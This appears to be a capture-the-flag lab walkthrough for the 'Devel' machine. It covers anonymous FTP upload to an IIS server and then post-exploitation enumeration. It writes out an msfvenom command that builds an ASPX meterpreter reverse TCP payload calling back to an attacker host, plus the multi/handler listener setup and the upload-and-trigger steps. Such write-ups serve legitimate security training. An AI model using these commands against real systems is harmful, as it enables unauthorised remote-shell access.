## Gaining a Foothold

### Devel (Using MSF conditions)  

**Initial Enum / RevShell Payload:**  
Nmap scan > iis server and ftp anonymous login identified > login ftp server and `PUT` test file sucessful > use msfvenom to generate a reverse tcp shell in aspx (since target is hosting iis)

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.05 LPORT=4444 -f aspx -o reverse.aspx`  

![image](https://github.com/user-attachments/assets/3db1aa08-39b4-45d2-afbe-01710f16b7cd)

**Listener with msfconsole multi handler:**  
msfconsole > use exploit/multi/handler > options > set payload windows/meterpreter/reverse_tcp > set LHOST ATTACKERIP > set LPORT 4444 > run

**Upload payload to iis:**  
ftp anonyomous login > `PUT reverse.aspx` > load http://victim/reverse.aspx (to trigger meterpreter reverse shell connection)  

#### System Enumeration  
now that we are a low level user, we repeat the cycle of info gathering, scanning enumeration further exploitation.

meterpreter: shell  
systeminfo  
hostname  

